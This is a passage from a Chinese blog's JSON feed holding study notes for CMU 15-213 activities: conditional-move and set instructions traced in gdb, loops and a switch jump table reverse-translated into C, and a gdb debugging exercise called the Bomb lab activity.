，其值如下：</p>\n<table>\n<thead>\n<tr>\n<th>arg1</th>\n<th>arg2</th>\n<th><code>sete</code></th>\n<th><code>setg</code></th>\n<th><code>seta</code></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0</td>\n<td>0</td>\n<td>1</td>\n<td>-</td>\n<td>-</td>\n</tr>\n<tr>\n<td>0</td>\n<td>1</td>\n<td>-</td>\n<td>-</td>\n<td>-</td>\n</tr>\n<tr>\n<td>1</td>\n<td>0</td>\n<td>-</td>\n<td>1</td>\n<td>1</td>\n</tr>\n<tr>\n<td>-1</td>\n<td>0</td>\n<td>-</td>\n<td>-</td>\n<td>1</td>\n</tr>\n<tr>\n<td>0</td>\n<td>-1</td>\n<td>-</td>\n<td>1</td>\n<td>-</td>\n</tr>\n<tr>\n<td>32768</td>\n<td>32767</td>\n<td>-</td>\n<td>-</td>\n<td>1</td>\n</tr>\n<tr>\n<td>32767</td>\n<td>32768</td>\n<td>-</td>\n<td>1</td>\n<td>-</td>\n</tr>\n<tr>\n<td>32768</td>\n<td>32768</td>\n<td>1</td>\n<td>-</td>\n<td>-</td>\n</tr>\n<tr>\n<td>32768</td>\n<td>−32768</td>\n<td>1</td>\n<td>-</td>\n<td>-</td>\n</tr>\n<tr>\n<td>−32768</td>\n<td>32768</td>\n<td>1</td>\n<td>-</td>\n<td>-</td>\n</tr>\n<tr>\n<td>−32768</td>\n<td>−32768</td>\n<td>1</td>\n<td>-</td>\n<td>-</td>\n</tr>\n</tbody>\n</table>\n<p><strong>从 <code>-1</code>  和 <code>0</code>  的两行比较可以看得出来， <code>seta</code>  是先将负数转化为 <code>unsigned</code>  类型的数，然后再相减。当数字的值超过 <code>signed</code>  类型范围后，会转化为负数，然后再比较。此处 <code>32768</code>  在进行有符号数比较时都被转化为 <code>-32768</code>  了</strong></p>\n<h2 id=\"tests-and-conditional-move-instructions\"><a class=\"markdownIt-Anchor\" href=\"#tests-and-conditional-move-instructions\">#</a> Tests and Conditional Move Instructions</h2>\n<p>输入下列指令开启当前 Activity:</p>\n<pre><code>$ gdb ./test-cmov\n(gdb) r\n</code></pre>\n<p>得到如下提示：</p>\n<pre><code>(gdb) r\nStarting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/machine-control/test-cmov\n\nThis program should be run inside GDB:\n  $ gdb /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/machine-control/test-cmov\n  (gdb) r\nIf you didn't run it that way, it will now crash.\nOtherwise, you will get the (gdb) prompt back.\n\nType 'c' (short for 'continue') at the (gdb) prompt.\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\nmain (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at machine-control/test-cmov.c:43\n43      machine-control/test-cmov.c: No such file or directory.\n(gdb)\n</code></pre>\n<p>输入 <code>c</code>  继续，得到如下提示：</p>\n<pre><code>(gdb) c\nContinuing.\n\nBesides 'main', this program defines three functions:\n    'cmove', 'cmovs', and 'cmovc'.\n\nUse the 'disassemble' command on each to see their code.\nThen, as instructed in the handout, use the 'call' command\nto call them with various arguments.\n\nWhen you have answered all the questions in this section of\nthe handout, use the 'c' command to go on.\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\nmain (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at machine-control/test-cmov.c:45\n45      in machine-control/test-cmov.c\n</code></pre>\n<p>对 <code>cmove</code> ， <code>cmovs</code>  和 <code>cmovc</code>  三个函数分别进行反汇编可以得到如下结果：</p>\n<pre><code class=\"language-asm\">(gdb) disassemble cmove\nDump of assembler code for function cmove:\n   0x00000000004005b3 &lt;+0&gt;:     mov    $0x0,%eax\n   0x00000000004005b8 &lt;+5&gt;:     test   %di,%di\n   0x00000000004005bb &lt;+8&gt;:     cmove  %esi,%eax\n   0x00000000004005be &lt;+11&gt;:    retq\nEnd of assembler dump.\n(gdb) disassemble cmovs\nDump of assembler code for function cmovs:\n   0x00000000004005bf &lt;+0&gt;:     mov    $0x0,%eax\n   0x00000000004005c4 &lt;+5&gt;:     test   %di,%di\n   0x00000000004005c7 &lt;+8&gt;:     cmovs  %esi,%eax\n   0x00000000004005ca &lt;+11&gt;:    retq\nEnd of assembler dump.\n(gdb) disassemble cmovc\nDump of assembler code for function cmovc:\n   0x00000000004005cb &lt;+0&gt;:     mov    $0x0,%eax\n   0x00000000004005d0 &lt;+5&gt;:     test   %di,%di\n   0x00000000004005d3 &lt;+8&gt;:     cmovb  %esi,%eax\n   0x00000000004005d6 &lt;+11&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>首先我们需要了解 <code>cmov</code>  三条指令分别是做什么的，可以参见<img data-src=\"mov.jpg\" alt=\"这张图\"></p>\n<p>其中 <code>cmove</code>  是当 <code>ZF = 1</code>  时为 1（相等或等于 0）， <code>cmovs</code>  是当 <code>SF = 1</code>  时为 1（为负数）， <code>cmovb</code>  时当 <code>CF = 1</code>  时为 1（低于，无符号 <code>&lt;</code> ）。上述三个函数的两个传入参数是 <code>%di</code>  和 <code>%esi</code> 。若 <code>%di</code>  满足条件，则将返回值设置为 <code>%esi</code> 。否则 <code>%eax = 0</code> 。由此可得， <code>arg1</code>  是 <code>%di</code> , <code>arg2</code>  是 <code>%esi</code> 。</p>\n<p>Q1: 为什么 <code>cmovc</code>  中使用的是 <code>cmovb</code>  指令？因为 <code>cmovc</code>  指令的意义是 <code>move if carry</code> <br>\nQ2:  <code>test</code>  指令使用的什么寄存器？使用的是 <code>%di</code> ，2 个字节。</p>\n<p>接下来填表：</p>\n<table>\n<thead>\n<tr>\n<th>Arg 1( <code>%di</code> )</th>\n<th>Arg 2( <code>%esi</code> )</th>\n<th>cmove (相等 / 0)</th>\n<th>cmovs (负数)</th>\n<th>cmovb (无符号 <code>&lt;</code> )</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0</td>\n<td>0</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>0</td>\n<td>1</td>\n<td>1</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>0</td>\n<td>2</td>\n<td>2</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>1</td>\n<td>0</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>1</td>\n<td>1</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>1</td>\n<td>2</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>−1</td>\n<td>0</td>\n<td></td>\n<td>0</td>\n<td></td>\n</tr>\n<tr>\n<td>−1</td>\n<td>1</td>\n<td></td>\n<td>1</td>\n<td></td>\n</tr>\n<tr>\n<td>−1</td>\n<td>2</td>\n<td></td>\n<td>2</td>\n<td></td>\n</tr>\n<tr>\n<td>32767</td>\n<td>1</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>32768</td>\n<td>1</td>\n<td></td>\n<td>1</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<p>未填写部分全为 0。从上表我们可以看到 <code>cmove</code>  只有在 <code>%di</code>  等于 0 时，才会等于 <code>%esi</code> 。而 <code>%esi</code>  只有在为 <code>%di</code>  负数时，才会等于 <code>%esi</code> （此外，如果 <code>%di</code>  的值超过了有符号数的上界，如 <code>32768</code> ，那么其会被转化为 <code>-32768</code> ，也就是最后一行，那么 <code>%di</code>  也是负数，因此 <code>%eax</code>  被赋值为 1）。此外， <code>cmovb</code>  一直等于 0，因为这里没有无符号的小于。</p>\n<h2 id=\"loops\"><a class=\"markdownIt-Anchor\" href=\"#loops\">#</a> Loops</h2>\n<p>按照 handout 提示输入 <code>objdump -d loops.o</code> ，得到如下结果：</p>\n<pre><code class=\"language-asm\">\nloops.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 &lt;forLoop&gt;:\n   0:   ba 00 00 00 00          mov    $0x0,%edx\n   5:   b8 00 00 00 00          mov    $0x0,%eax\n   a:   39 f0                   cmp    %esi,%eax\n   c:   7d 0b                   jge    19 &lt;forLoop+0x19&gt;\n   e:   48 63 c8                movslq %eax,%rcx\n  11:   03 14 8f                add    (%rdi,%rcx,4),%edx\n  14:   83 c0 01                add    $0x1,%eax\n  17:   eb f1                   jmp    a &lt;forLoop+0xa&gt;\n  19:   89 d0                   mov    %edx,%eax\n  1b:   c3                      retq\n</code></pre>\n<p>该汇编代码的 C 语言形式如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">forLoop</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token operator\">*</span> x<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> len<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   <span class=\"token keyword\">int</span> ret <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>   <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> len<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      ret <span class=\"token operator\">+=</span> x<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   <span class=\"token keyword\">return</span> ret<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><pre><code>000000000000001c &lt;whileLoop&gt;:\n  1c:   ba 00 00 00 00          mov    $0x0,%edx\n  21:   b8 00 00 00 00          mov    $0x0,%eax\n  26:   39 f0                   cmp    %esi,%eax\n  28:   7d 0b                   jge    35 &lt;whileLoop+0x19&gt;\n  2a:   48 63 c8                movslq %eax,%rcx\n  2d:   03 14 8f                add    (%rdi,%rcx,4),%edx\n  30:   83 c0 01                add    $0x1,%eax\n  33:   eb f1                   jmp    26 &lt;whileLoop+0xa&gt;\n  35:   89 d0                   mov    %edx,%eax\n  37:   c3                      retq\n</code></pre>\n<p>该循环的 C 形式代码如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">whileLoop</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token operator\">*</span> x<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> len<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   <span class=\"token keyword\">int</span> ret <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>   <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">&lt;</span> len<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      ret <span class=\"token operator\">+=</span> x<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>   <span class=\"token keyword\">return</span> ret<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><pre><code>0000000000000038 &lt;doWhileLoop&gt;:\n  38:   ba 00 00 00 00          mov    $0x0,%edx\n  3d:   b8 00 00 00 00          mov    $0x0,%eax\n  42:   48 63 c8                movslq %eax,%rcx\n  45:   03 14 8f                add    (%rdi,%rcx,4),%edx\n  48:   83 c0 01                add    $0x1,%eax\n  4b:   39 f0                   cmp    %esi,%eax\n  4d:   7c f3                   jl     42 &lt;doWhileLoop+0xa&gt;\n  4f:   89 d0                   mov    %edx,%eax\n  51:   c3                      retq\n</code></pre>\n<p><code>doWhileLoop</code>  的 C 循环代码如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">doWhileLoop</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token operator\">*</span> x<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> len<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   <span class=\"token keyword\">int</span> ret <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>   <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>   <span class=\"token keyword\">do</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      ret <span class=\"token operator\">+=</span> x<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">&lt;</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   <span class=\"token keyword\">return</span> ret<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"switch-statements\"><a class=\"markdownIt-Anchor\" href=\"#switch-statements\">#</a> Switch Statements</h2>\n<p><code>switch</code>  语句汇编代码如下：</p>\n<pre><code class=\"language-asm\">switcher:\n   cmpq $7 , %rdi\n   ja .L2\n   jmp *.L4(, %rdi , 8)\n.L7:\n   xorq $15 , %rsi\n   movq %rsi , %rdx\n.L3:\n   leaq 112(% rdx), %rdi\n   jmp .L6\n.L5:\n   leaq (%rdx , %rsi), %rdi\n   salq $2 , %rdi\n   jmp .L6\n.L2:\n   movq %rsi , %rdi\n.L6:\n   movq %rdi , (% rcx)\n   ret\n.section .rodata\n.L4:\n   .quad .L3 ;;x = 0 -&gt; rdi = rdx + 112; break;\n   .quad .L2 ;;x = 1 -&gt; default\n   .quad .L5 ;;x = 2 -&gt; rdi = rdx + rsi; rdi = rdi &lt;&lt; 2; break;\n   .quad .L2 ;;x = 3 -&gt; default\n   .quad .L6 ;;x = 4 -&gt; *rcx = rdi; break;\n   .quad .L7 ;;x = 5 -&gt; rsi = rsi ^ 15; rdx = rsi;\n   .quad .L2 ;;x = 6 -&gt; default\n   .quad .L5 ;;x = 7 -&gt; rdi = rdx + rsi; rdi = rdi &lt;&lt; 2; break;\n\n</code></pre>\n<p>其还原的 C 语句代码如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 1, 3, 6 没有；只有 0，2，4，5，7</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// %rdi = a and val , %rsi = b, %rdx = c, %rcx = dest</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">switcher</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span> a<span class=\"token punctuation\">,</span> <span class=\"token keyword\">long</span> b<span class=\"token punctuation\">,</span> <span class=\"token keyword\">long</span> c<span class=\"token punctuation\">,</span> <span class=\"token keyword\">long</span> <span class=\"token operator\">*</span>dest<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>   <span class=\"token keyword\">long</span> val<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      <span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>         c <span class=\"token operator\">=</span> b <span class=\"token operator\">^</span> <span class=\"token number\">15</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>      <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>         val <span class=\"token operator\">=</span> c <span class=\"token operator\">+</span> <span class=\"token number\">112</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>         <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token keyword\">case</span> <span class=\"token number\">7</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>         val <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>c <span class=\"token operator\">+</span> b<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>         <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>         val <span class=\"token operator\">=</span> a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>         <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      <span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>         val <span class=\"token operator\">=</span> b<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>   <span class=\"token operator\">*</span>dest <span class=\"token operator\">=</span> val<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>注意 <code>case 4</code>  中，按理来说 <code>.L4</code>  时 <code>val = a</code>  而不是 <code>*dest = val</code> （汇编来看）。这里我们再将 C 编译成汇编语句时，对 C 语言的语句做了一个优化，将 <code>*dest = val</code>  转化为两句：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>val <span class=\"token operator\">=</span> a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">*</span>dest <span class=\"token operator\">=</span> val<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这样转化的原因<strong>是在 C 语言中 <code>*dest = val</code>  是所有语句共同需要执行的部分，因此我们将它放在 <code>switch</code>  语句之外，而将 <code>val = a</code>  放在语句内</strong>。这样语句前后意思是一样的，而 <code>switch</code>  语句的目的也达到了。而汇编层面做了优化，将 <code>*dest = val</code>  直接放在 <code>.L6</code>  处，其他语句执行完后跳转到 <code>.L6</code> 。</p>\n",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Bomb%20lab%20activity/",
            "url": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Bomb%20lab%20activity/",
            "title": "15-213 Bomb lab Activity 记录",
            "date_published": "2024-02-29T09:11:59.000Z",
            "content_html": "<h2 id=\"part-i\"><a class=\"markdownIt-Anchor\" href=\"#part-i\">#</a> Part I</h2>\n<p>输入如下命令：</p>\n<pre><code>$ gcc -o phase1 -g -std=c99 phase1.c\n$ gdb ./phase1\n</code></pre>\n<p>按照 handout 依次输入命令并观察结果。</p>\n<h3 id=\"打断点\"><a class=\"markdownIt-Anchor\" href=\"#打断点\">#</a> 打断点</h3>\n<pre><code>(gdb) break main\nBreakpoint 1 at 0x13b2: file phase1.c, line 54.\n(gdb) break unscramble\nBreakpoint 2 at 0x1308: file phase1.c, line 39.\n(gdb) break reverse\nBreakpoint 3 at 0x1274: file phase1.c, line 30.\n(gdb) break toggleCase\nBreakpoint 4 at 0x11e7: file phase1.c, line 18.\n(gdb) info break\nNum     Type           Disp Enb Address            What\n1       breakpoint     keep y   0x00000000000013b2 in main at phase1.c:54\n2       breakpoint     keep y   0x0000000000001308 in unscramble at phase1.c:39\n3       breakpoint     keep y   0x0000000000001274 in reverse at phase1.c:30\n4       breakpoint     keep y   0x00000000000011e7 in toggleCase at phase1.c:18\n</code></pre>\n<h3 id=\"运行程序-打印值\"><a class=\"markdownIt-Anchor\" href=\"#运行程序-打印值\">#</a> 运行程序 &amp; 打印值</h3>\n<pre><code>(gdb) run\nStarting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/lab2_handout/phase1\n\nBreakpoint 1, main () at phase1.c:54\n54      int main () &#123;\n(gdb) n\n55          word_t *secret_msg = (word_t *) calloc(1, sizeof(word_t));\n(gdb) n\n56          secret_msg-&gt;str = (char *) calloc(length, sizeof(char));\n(gdb) print *(word_t*)secret_msg\n$1 = &#123;str = 0x0, len = 0&#125;\n(gdb) next\n57          strncpy(secret_msg-&gt;str, &quot;!312 Av XPHy QBBt&quot;, length);;\n(gdb) print *(word_t*)secret_msg\n$2 = &#123;str = 0x5555555592c0 &quot;&quot;, len = 0&#125;\n</code></pre>\n<h3 id=\"单步调试-watchpoint\"><a class=\"markdownIt-Anchor\" href=\"#单步调试-watchpoint\">#</a> 单步调试 &amp; watchpoint</h3>\n<pre><code>Breakpoint 2, unscramble (msg=0x555555555480 &lt;__libc_csu_init&gt;) at phase1.c:39\n39      void unscramble (word_t *msg) &#123;\n(gdb) step\n41          char chng = 13;\n(gdb) next\n42          for (int i = 0; i &lt; msg-&gt;len; i++) &#123;\n(gdb) next\n43              ltr = msg-&gt;str[i];\n(gdb) print(ltr)\n$3 = 85 'U'\n(gdb) print isAlpha(ltr)\n$4 = true\n(gdb) watch ltr\nHardware watchpoint 5: ltr\n(gdb) c\nContinuing.\n\nHardware watchpoint 5: ltr\n\nOld value = 85 'U'\nNew value = 33 '!'\nunscramble (msg=0x5555555592a0) at phase1.c:44\n44              if (isAlpha(ltr)) &#123;\n(gdb) step\nisAlpha (ltr=85 'U') at phase1.c:13\n13      bool isAlpha (char ltr) &#123;\n(gdb) backtrace\n#0  isAlpha (ltr=85 'U') at phase1.c:13\n#1  0x0000555555555345 in unscramble (msg=0x5555555592a0) at phase1.c:44\n#2  0x0000555555555429 in main () at phase1.c:60\n</code></pre>\n<h3 id=\"3-questions\"><a class=\"markdownIt-Anchor\" href=\"#3-questions\">#</a> 3 Questions</h3>\n<ol>\n<li>What does  <code>unscramble(word_t *msg)</code>  do? And how?<br>\n 将 <code>secret_msg</code>  指向的结构体中的 <code>!312 Av XPHy QBBt</code>  替换成了 <code>!312 Ni KCUl DOOg</code> 。<br>\n <code>unscramble</code>  的作用是：判断 <code>msg_str</code>  当前的字符，如果 <code>M &lt; ltr &lt;= Z</code> ，就将其字符值减去 13。否则加上 13。</li>\n<li>What does  <code>reverse(word_t *msg)</code>  do? And how?<br>\n 将 <code>secret_msg</code>  指向的结构体中的 <code>!312 Ni KCUl DOOg</code>  替换成了 <code>gOOD lUCK iN 213!</code> 。该函数反转字符串。</li>\n<li>What does  <code>toggleCase(word_t *msg)</code>  do? And how?<br>\n 将 <code>secret_msg</code>  指向的结构体中的 <code>gOOD lUCK iN 213!</code>  替换成了 <code>Good Luck In 213!</code> 。该函数反转字符串大小写。</li>\n</ol>\n<h2 id=\"part-ii\"><a class=\"markdownIt-Anchor\" href=\"#part-ii\">#</a> Part II</h2>\n<p>输入 <code>gcc -std=c99 -o phase2 -g phase2.c</code>  编译生成 <code>phase2</code> ，对其利用 <code>gdb</code>  进行排错发现 <code>S-&gt;top-&gt;len</code>  为 0，导致浮点数相除时发生错误。我们进行如下修改：</p>\n<ol>\n<li>在初始化栈的时候让栈顶的长度为 0</li>\n<li><code>push</code>  新结点的时候让结点的 <code>len</code>  为栈顶结点的长度加 1，然后让栈顶指向结点</li>\n<li><code>pop</code>  时结点弹出，栈顶指向的新结点的长度值为弹出结点长度减 1</li>\n</ol>\n",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/gdb%20&%20asm%20activity/",
            "url": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/gdb%20&%20asm%20activity/",
            "title": "15-213 GDB and Assembly Activity 记录",
            "date_published": "2024-02-29T09:10:30.000Z",
            "content_html": "<h2 id=\"activity-1\"><a class=\"markdownIt-Anchor\" href=\"#activity-1\">#</a> Activity 1</h2>\n<p>运行</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gdb ./act1</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">(</span>gdb<span class=\"token punctuation\">)</span> r <span class=\"token number\">1</span></pre></td></tr></table></figure><p>出现如下提示:</p>\n<pre><code>If you have questions about the commands, type (gdb) help &lt;command&gt;\nNow type (gdb) info registers\nThis will display all of the integer registers.\nRegisters are basically the only local &quot;variables&quot; in assembly.\nThey are not located in memory, but instead directly within the CPU core.\n  As such, they have no memory addresses and are referred to by name.\nAlthough historically each register had a special purpose, now only %rsp does.\n  It points to the top of the stack.\nLook over the other registers: do any of them have familiar values, such as 1?\nQ.  Given the information that GDB just stopped the program at the beginning\n    of a function taking one or more arguments, write down your best guess at the\n    purposes of the %rsp, %rdi, and %rax registers.\n\nDuring this activity, gdb will print ... SIGTRAP ....  This is expected.\nIt indicates that the program, such as act1, triggered a breakpoint.\nWhen you are finished looking at the registers, type r 2 &lt;enter&gt;\nGDB may ask you if you want to start the program from the beginning (y or n) y\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n</code></pre>\n<p>根据提示，输入 <code>info registers</code>  后，显示值如下：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">(</span>gdb<span class=\"token punctuation\">)</span> info registers</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>rax            0x4f                <span class=\"token number\">79</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>rbx            0x0                 <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>rcx            0x7ffff7ec3297      <span class=\"token number\">140737352839831</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>rdx            0x0                 <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>rsi            0x6042a0            <span class=\"token number\">6308512</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>rdi            0x1                 <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>rbp            0x0                 0x0</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>rsp            0x7fffffffde40      0x7fffffffde40</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>r8             0x4f                <span class=\"token number\">79</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>r9             0x39                <span class=\"token number\">57</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>r10            0x400397            <span class=\"token number\">4195223</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>r11            0x246               <span class=\"token number\">582</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>r12            0x400590            <span class=\"token number\">4195728</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>r13            0x7fffffffdf40      <span class=\"token 